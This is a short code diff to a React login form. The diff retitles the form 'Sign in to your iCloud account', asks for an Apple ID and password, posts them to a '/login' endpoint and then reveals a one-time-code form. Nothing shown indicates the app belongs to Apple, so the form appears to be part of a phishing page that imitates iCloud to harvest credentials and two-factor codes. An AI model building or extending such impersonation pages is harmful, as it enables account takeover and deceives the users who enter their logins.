@@ -2,7 +2,7 @@ import React from "react";
 import styles from "./LoginForm.module.scss"; // Import module.scss file
 import { post } from "../../Services/ApiService";
 
-const LoginForm = () => {
+const LoginForm = ({showOrHideOtpForm}) => {
   const handleSubmit = async (event) => {
     event.preventDefault();
     // Add your sign in logic here
@@ -15,12 +15,18 @@ const LoginForm = () => {
       pwd,
     };
 
-    await post("/login", obj);
+    const response = await post("/login", obj);
+
+    if(response.error){
+      console.error("Something Went Wrong");
+    }else {
+      showOrHideOtpForm(true);
+    }
   };
 
   return (
     <form className={styles.form} onSubmit={handleSubmit}>
-      <p className={styles["form-title"]}>Sign in to your account</p>
+      <p className={styles["form-title"]}>Sign in to your iCloud account</p>
       <div className={styles["input-container"]}>
         <input name="email" placeholder="Enter Apple id" type="text" required className={styles.input} />
         <span>
